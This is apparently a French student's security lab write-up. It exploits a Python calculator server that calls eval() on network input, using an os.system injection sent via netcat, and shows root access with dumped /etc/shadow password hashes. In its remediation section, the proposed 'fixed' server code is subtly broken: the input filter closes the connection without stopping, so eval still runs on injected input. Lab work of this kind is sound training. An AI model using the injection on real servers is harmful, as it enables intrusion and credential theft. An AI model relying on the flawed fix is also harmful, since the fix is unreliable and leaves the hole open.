# TP5 SECU : Exploit, pwn, fix

## 1. Reconnaissance

**🌞 Déterminer**

    Wireshark

**🌞 Scanner le réseau**

    [l3z@localhost ~]$ sudo nmap -sS -p 13337 127.0.0.1
    [sudo] password for l3z: 
    Starting Nmap 7.92 ( https://nmap.org ) at 2025-03-07 10:36 CET
    Nmap scan report for localhost (127.0.0.1)
    Host is up (0.00013s latency).

    PORT      STATE  SERVICE
    13337/tcp closed unknown

    Nmap done: 1 IP address (1 host up) scanned in 0.17 seconds


**🌞 Connectez-vous au serveur**

    c'est une calculatrice qui utilise l'ip 127.0.0.1 et le port 13337

## 2. Exploit

**🌞 Injecter du code serveur**

    [l3z@localhost ~]$ netcat 193.250.183.197 12781
    d
    Hello__import__('os').system('sleep 5')
    0

**3. PWN**

    [root@localhost l3z]# cat /etc/shadow
    root:!$6$9z/LzYxayrhGIEiy$GjDVk/p2V2lcSPUtuzyas/F93Fjq0JbqMonJ0IO.iarGmCsX5.A01NLXxH0ecDsQe8jZBQVt6h1ctQFax5D0k0::0:99999:7:::
    bin:*:19820:0:99999:7:::
    daemon:*:19820:0:99999:7:::
    adm:*:19820:0:99999:7:::
    lp:*:19820:0:99999:7:::
    sync:*:19820:0:99999:7:::
    shutdown:*:19820:0:99999:7:::
    halt:*:19820:0:99999:7:::
    mail:*:19820:0:99999:7:::
    operator:*:19820:0:99999:7:::
    games:*:19820:0:99999:7:::
    ftp:*:19820:0:99999:7:::
    nobody:*:19820:0:99999:7:::
    tss:!!:20151::::::
    systemd-coredump:!!:20151::::::
    dbus:!!:20151::::::
    sssd:!!:20151::::::
    chrony:!!:20151::::::
    sshd:!!:20151::::::
    l3z:$6$jUgGI2dbV.8RaVVN$Zxk7EYCSGpVbr6qBg2TjWZ22PQ5FESt9oaQKD0zB92ORd10ottvvyg1ecmrS01/.a.HZh.aPDSOFPFt2RiGiB0::0:99999:7:::

##

    [root@localhost l3z]# cat /etc/passwd
    root:x:0:0:root:/root:/bin/bash
    bin:x:1:1:bin:/bin:/sbin/nologin
    daemon:x:2:2:daemon:/sbin:/sbin/nologin
    adm:x:3:4:adm:/var/adm:/sbin/nologin
    lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
    sync:x:5:0:sync:/sbin:/bin/sync
    shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
    halt:x:7:0:halt:/sbin:/sbin/halt
    mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
    operator:x:11:0:operator:/root:/sbin/nologin
    games:x:12:100:games:/usr/games:/sbin/nologin
    ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
    nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
    tss:x:59:59:Account used for TPM access:/:/usr/sbin/nologin
    systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin
    dbus:x:81:81:System message bus:/:/sbin/nologin
    sssd:x:998:996:User for sssd:/:/sbin/nologin
    chrony:x:997:995:chrony system user:/var/lib/chrony:/sbin/nologin
    sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/usr/sbin/nologin
    l3z:x:1000:1000:l3z:/home/l3z:/bin/bash
    
##

       [root@localhost l3z]#  cat server.py
        cat server.py
        import socket

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', 13337))  

        s.listen(1)
        conn, addr = s.accept()

        while True:

            try:
                # On reçoit la string Hello du client
                data = conn.recv(1024)
                if not data: break
                print(f"Données reçues du client : {data}")

                conn.send("Hello".encode())

                # On reçoit le calcul du client
                data = conn.recv(1024)
                data = data.decode().strip("\n")

                # Evaluation et envoi du résultat
                res  = eval(data)
                conn.send(str(res).encode())
                
            except socket.error:
                print("Error Occured.")
                break

        conn.close()

##

    [root@localhost l3z]#  systemctl list-units -t service
    systemctl list-units -t service
    UNIT                               LOAD   ACTIVE SUB     DESCRIPTION
    auditd.service                     loaded active running Security Auditing Service
    calculatrice.service               loaded active running Super calculatrice réseau
    chronyd.service                    loaded active running NTP client/server
    crond.service                      loaded active running Command Scheduler
    dbus-broker.service                loaded active running D-Bus System Message Bus
    dracut-shutdown.service            loaded active exited  Restore /run/initramfs on shutdown
    firewalld.service                  loaded active running firewalld - dynamic firewall daemon
    getty@tty1.service                 loaded active running Getty on tty1
    kdump.service                      loaded active exited  Crash recovery kernel arming
    kmod-static-nodes.service          loaded active exited  Create List of Static Device Nodes
    lm_sensors.service                 loaded active exited  Hardware Monitoring Sensors
    lvm2-monitor.service               loaded active exited  Monitoring of LVM2 mirrors, snapshots etc. using dmeventd or progress polling
    netdata.service                    loaded active running Real time performance monitoring
    NetworkManager-wait-online.service loaded active exited  Network Manager Wait Online
    NetworkManager.service             loaded active running Network Manager
    nis-domainname.service             loaded active exited  Read and set NIS domainname from /etc/sysconfig/network
    rsyslog.service                    loaded active running System Logging Service
    sshd.service                       loaded active running OpenSSH server daemon
    systemd-boot-update.service        loaded active exited  Automatic Boot Loader Update
    systemd-journal-flush.service      loaded active exited  Flush Journal to Persistent Storage
    systemd-journald.service           loaded active running Journal Service
    systemd-journald@netdata.service   loaded active running Journal Service for Namespace netdata
    systemd-logind.service             loaded active running User Login Management
    systemd-network-generator.service  loaded active exited  Generate network units from Kernel command line
    systemd-random-seed.service        loaded active exited  Load/Save OS Random Seed
    systemd-remount-fs.service         loaded active exited  Remount Root and Kernel File Systems
    systemd-sysctl.service             loaded active exited  Apply Kernel Variables
    systemd-tmpfiles-setup-dev.service loaded active exited  Create Static Device Nodes in /dev
    systemd-tmpfiles-setup.service     loaded active exited  Create Volatile Files and Directories
    systemd-udev-trigger.service       loaded active exited  Coldplug All udev Devices
    systemd-udevd.service              loaded active running Rule-based Manager for Device Events and Files
    systemd-update-utmp.service        loaded active exited  Record System Boot/Shutdown in UTMP
    systemd-user-sessions.service      loaded active exited  Permit User Sessions
    user-runtime-dir@1000.service      loaded active exited  User Runtime Directory /run/user/1000
    user@1000.service                  loaded active running User Manager for UID 1000

## II. Remédiation

**🌞 Proposer une remédiation dév**

    Évitez d'utiliser eval() dans le code, car cela permet d'exécuter du code Python arbitraire au lieu de simplement effectuer un calcul.
    Ajoutez des conditions côté serveur pour filtrer les entrées, par exemple :

    import socket
    import re

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', 13337))  

    s.listen(1)
    conn, addr = s.accept()

    while True:

        try:
            # On reçoit la string Hello du client
            data = conn.recv(1024)
            if not data: break
            print(f"Données reçues du client : {data}")

            conn.send("Hello".encode())

            # On reçoit le calcul du client
            data = conn.recv(1024)
            data = data.decode().strip("\n")
            # condition ajouté
            for i in data:
                if i not in '0123456789 +-*':
                    conn.close()
            # Evaluation et envoi du résultat
            
            res  = eval(data)
            conn.send(str(res).encode())
            
            
        except socket.error:
            print("Error Occured.")
            break

    conn.close()

**🌞 Proposer une remédiation système**

    Ne pas exécuter le serveur avec les privilèges root pour des raisons de sécurité.
    
    S'assurer que le serveur ne transmet aucune information vers l'extérieur en bloquant toutes les connexions sortantes, sauf celles strictement nécessaires à son fonctionnement.
